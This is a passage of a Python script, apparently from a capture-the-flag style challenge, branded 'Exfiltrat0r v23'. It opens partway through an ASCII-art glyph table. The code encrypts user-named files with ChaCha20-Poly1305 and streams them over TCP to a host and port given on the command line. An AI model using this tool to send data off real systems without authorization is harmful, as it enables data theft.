\u001b[0;1;32;92m-_\u001b[0;1;36;96m)\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m_/\u001b[0m \n     \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m   \n      \n", "       \n  \u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m_\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m`\u001b[0;1;34;94m/\u001b[0m\n \u001b[0;1;32;92m\\\u001b[0;1;36;96m_,\u001b[0m \u001b[0;1;34;94m/\u001b[0m \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m  \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m//\u001b[0;1;34;94m_/\u001b[0m\n      \n", "   \u001b[0;1;31;91m_\u001b[0m \n  \u001b[0;1;33;93m(_\u001b[0;1;32;92m)\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m  \n     \n", "      \u001b[0;1;32;92m_\u001b[0m \n     \u001b[0;1;32;92m(\u001b[0;1;36;96m_)\u001b[0m\n    \u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m \n \u001b[0;1;32;92m_\u001b[0;1;36;96m_/\u001b[0m \u001b[0;1;34;94m/\u001b[0m  \n\u001b[0;1;36;96m|_\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m   \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m  \n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/_\u001b[0;1;36;96m_\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m  \u001b[0;1;36;96m'_\u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\\\u001b[0;1;34;94m_\\\u001b[0m \n       \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m\n  \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m \n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m  \n     \n", "       \n  \u001b[0;1;33;93m__\u001b[0m \u001b[0;1;32;92m_\u001b[0m \n \u001b[0;1;33;93m/\u001b[0m  \u001b[0;1;36;96m'\u001b[0m \u001b[0;1;34;94m\\\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/_\u001b[0;1;34;94m/_\u001b[0;1;35;95m/\u001b[0m\n       \n", "      \n  \u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m \n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m//\u001b[0;1;34;94m_/\u001b[0m\n      \n", "     \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m\\\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m\n     \n", "       \n   \u001b[0;1;33;93m_\u001b[0;1;32;92m__\u001b[0m \n  \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m_\u001b[0m \u001b[0;1;34;94m\\\u001b[0m\n \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m.\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m\n\u001b[0;1;36;96m/_\u001b[0;1;34;94m/\u001b[0m    \n", "      \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m \u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0m \u001b[0;1;36;96m`/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m,\u001b[0m \u001b[0;1;34;94m/\u001b[0m \n \u001b[0;1;36;96m/\u001b[0;1;34;94m_/\u001b[0m  \n", "      \n  \u001b[0;1;33;93m__\u001b[0;1;32;92m__\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m_/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m/\u001b[0m   \n      \n", "     \n  \u001b[0;1;33;93m__\u001b[0;1;32;92m_\u001b[0m\n \u001b[0;1;33;93m(\u001b[0;1;32;92m_-\u001b[0;1;36;96m<\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m\n     \n", "  \u001b[0;1;31;91m__\u001b[0m \n \u001b[0;1;31;91m/\u001b[0m \u001b[0;1;33;93m/\u001b[0;1;32;92m_\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m__\u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m_/\u001b[0m \n     \n", "      \n \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m__\u001b[0m\n\u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m//\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m\\_\u001b[0;1;36;96m,_\u001b[0;1;34;94m/\u001b[0m \n      \n", "      \n \u001b[0;1;31;91m_\u001b[0m  \u001b[0;1;32;92m__\u001b[0m\n\u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m|/\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m|_\u001b[0;1;36;96m__\u001b[0;1;34;94m/\u001b[0m \n      \n", "        \n \u001b[0;1;31;91m_\u001b[0m    \u001b[0;1;36;96m__\u001b[0m\n\u001b[0;1;33;93m|\u001b[0m \u001b[0;1;32;92m|/\u001b[0;1;36;96m|/\u001b[0m \u001b[0;1;34;94m/\u001b[0m\n\u001b[0;1;32;92m|_\u001b[0;1;36;96m_,\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m \n        \n", "      \n \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m \u001b[0;1;32;92m__\u001b[0m\n \u001b[0;1;33;93m\\\u001b[0m \u001b[0;1;32;92m\\\u001b[0m \u001b[0;1;36;96m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m\\_\u001b[0;1;34;94m\\\u001b[0m \n      \n", "       \n  \u001b[0;1;33;93m__\u001b[0m \u001b[0;1;32;92m_\u001b[0;1;36;96m_\u001b[0m\n \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0;1;36;96m/\u001b[0m \u001b[0;1;34;94m/\u001b[0m\n \u001b[0;1;32;92m\\\u001b[0;1;36;96m_,\u001b[0m \u001b[0;1;34;94m/\u001b[0m \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m__\u001b[0;1;35;95m/\u001b[0m  \n", "    \n \u001b[0;1;31;91m_\u001b[0;1;33;93m__\u001b[0m\n\u001b[0;1;33;93m/_\u001b[0m \u001b[0;1;32;92m/\u001b[0m\n\u001b[0;1;32;92m/_\u001b[0;1;36;96m_/\u001b[0m\n    \n", "    \u001b[0;1;33;93m__\u001b[0m\n  \u001b[0;1;33;93m_/\u001b[0;1;32;92m_/\u001b[0m\n\u001b[0;1;33;93m_/\u001b[0m \u001b[0;1;32;92m/\u001b[0m  \n\u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m   \n\u001b[0;1;36;96m\\_\u001b[0;1;34;94m\\\u001b[0m   \n", "    \u001b[0;1;33;93m__\u001b[0m\n   \u001b[0;1;33;93m/\u001b[0m \u001b[0;1;32;92m/\u001b[0m\n  \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m \n \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0m  \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m/\u001b[0m   \n", "   \u001b[0;1;31;91m_\u001b[0;1;33;93m_\u001b[0m  \n   \u001b[0;1;33;93m\\\u001b[0m \u001b[0;1;32;92m\\\u001b[0m \n   \u001b[0;1;32;92m/\u001b[0m \u001b[0;1;36;96m/\u001b[0;1;34;94m_\u001b[0m\n \u001b[0;1;32;92m_\u001b[0;1;36;96m/_\u001b[0;1;34;94m/\u001b[0m  \n\u001b[0;1;36;96m/_\u001b[0;1;34;94m/\u001b[0m    \n", " \u001b[0;1;35;95m/\u001b[0;1;31;91m\\/\u001b[0;1;33;93m/\u001b[0m\n\u001b[0;1;31;91m//\u001b[0;1;33;93m\\/\u001b[0m \n     \n     \n     \n", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""]
ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
u8 = lambda v: struct.pack("B", v)
u32 = lambda v: struct.pack(">I", v)


def ansi_remove(data):
    return ansi_escape.sub('', data)


def chunked_iterable(iterable, size):
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, size))
        if not chunk:
            break
        yield chunk


class Colorize:
    @staticmethod
    def red(string):
        return "\033[91m\033[1m" + string + "\033[0m"
    
    @staticmethod
    def green(string):
        return "\033[92m\033[1m" + string + "\033[0m"


class CryptMsg:
    def __init__(self, key, filename, host, port):
        self.filename = os.path.abspath(filename)
        self.version = 1
        self.filename = filename
        self.key = key
        self.key_salt = get_random_bytes(16)
        self.derived_key = scrypt(self.key, self.key_salt, 32, 2**14, 8, 1)
        self.cipher = ChaCha20_Poly1305.new(key=self.derived_key)
        self.host = host
        self.port = port
        self.sock = None
        self.finished = False

    def _send_preamble(self):
        self.sock.sendall(b"".join([
            u8(self.version),
            u8(len(self.cipher.nonce)),
            self.cipher.nonce,
            u8(len(self.key_salt)),
            self.key_salt,
            self.cipher.encrypt(u32(len(self.filename))),
            self.cipher.encrypt(self.filename.encode()),
        ]))

    def _send_file(self):
        with open(self.filename, "rb") as infile:
            while chunk := infile.read(4096):
                self.sock.sendall(self.cipher.encrypt(chunk))

    def _send_digest(self):
        self.sock.sendall(self.cipher.digest())

    def tx(self):
        self.sock = socket.create_connection((self.host, self.port))
        self._send_preamble()
        self._send_file()
        self._send_digest()
        self.sock.close()
        self.finished = True

    def __repr__(self):
        return ("CryptMsg<key: {s.key!r}, filename: {s.filename!r}, "
               "host: {s.host!r}, port: {s.port!r}, finished: "
               "{s.finished!r}>").format(s=self)


class AsciiChar:
    def __init__(self, lines):
        self.lines = lines
        max_width = 0
        for line in self.lines:
            line = ansi_remove(line)
            if len(line) > max_width:
                max_width = len(line)
        self.adjust_width(max_width)

    def adjust_width(self, width):
        for i, line in enumerate(self.lines):
            self.lines[i] = line.ljust(width)

    def adjust_height(self, height):
        if len(self.lines) < height:
            self.lines = [" "*self.width] * (height - len(self.lines)) + self.lines

    @property
    def width(self):
        return len(ansi_remove(self.lines[0]))

    @property
    def height(self):
        return len(self.lines)


class AsciiSequence:
    def __init__(self, initial=""):
        self.ascii_chars = []
        self.plain_chars = []
        for c in initial:
            self.add_char(c)
    
    def pop(self):
        if self.ascii_chars:
            self.ascii_chars.pop()
            self.plain_chars.pop()
    
    def add_char(self, char):
        self.plain_chars.append(char)
        char = AsciiChar(table[ord(char)].splitlines())
        if char.height > self.height:
            for c in self.ascii_chars:
                c.adjust_height(char.height)
        self.ascii_chars.append(char)
    
    def render(self):
        buf = ""
        for line_idx in range(self.ascii_chars[0].height):
            for row_idx in range(len(self.ascii_chars)):
                buf += self.ascii_chars[row_idx].lines[line_idx]
            buf += "\n"
        return buf
    
    def clear(self):
        buf = ""
        for _ in range(self.height):
            buf += "\033[A" + " " * self.width
            buf += "\033[D" * self.width
        return buf

    @property
    def height(self):
        if self.ascii_chars:
            return self.ascii_chars[0].height
        return  0

    @property
    def width(self):
        return sum(c.width for c in self.ascii_chars)

    def __len__(self):
        return len(self.plain_chars)


def colorize(string):
    return AsciiSequence(string).render()


def print_linewise(string, delay=0.02):
    for line in string.splitlines():
        sys.stdout.write(line)
        sys.stdout.write("\n")
        sys.stdout.flush()
        if delay:
            sleep(delay)


def print_chunks(string, delay=0.001):
    for chunk in chunked_iterable(string, 6):
        sys.stdout.write("".join(chunk))
        sys.stdout.flush()
        sleep(delay)


def banner():
    print_chunks(colorize("Exfiltrat0r v23"))
    print_chunks(colorize("-----------------"))


def interactive_key():
    print_linewise(colorize("Enter key:"))

    def getch():
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        tty.setraw(sys.stdin.fileno())

        ch = sys.stdin.read(1)

        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

        return ch

    sequence = AsciiSequence()

    while c := getch():
        if c == "\r":
            if len(sequence) >0:
                break
            continue
        elif c == "\x03":
            raise KeyboardInterrupt            
        elif c == "\x7f":
            with suppress(IndexError):
                sys.stdout.write(sequence.clear())
                sys.stdout.flush()
                sequence.pop()
                sys.stdout.write(sequence.render())
                sys.stdout.flush()
            continue

        if sequence.plain_chars:
            sys.stdout.write(sequence.clear())

        sequence.add_char(c)

        sys.stdout.write(sequence.render())
        sys.stdout.flush()

    return "".join(sequence.plain_chars)


def main(host, port, files, key=None):
    banner()

    if key is None:
        key = interactive_key()

    def done(msg, fut):
        if exc := fut.exception():
            print(Colorize.red("Transfer failed: {} ({})".format(msg, exc)))
        else:
            print(Colorize.green("Transfer complete: {}".format(msg)))

    with ThreadPoolExecutor(max_workers=8) as executor:
        for path in files:
            msg = CryptMsg(key, path, host, port)
            executor.submit(msg.tx).add_done_callback(partial(done, msg))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-k", "--key")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument("file", nargs="+")
    args = parser.parse_args()
    main(args.host, args.port, args.file, args.key)
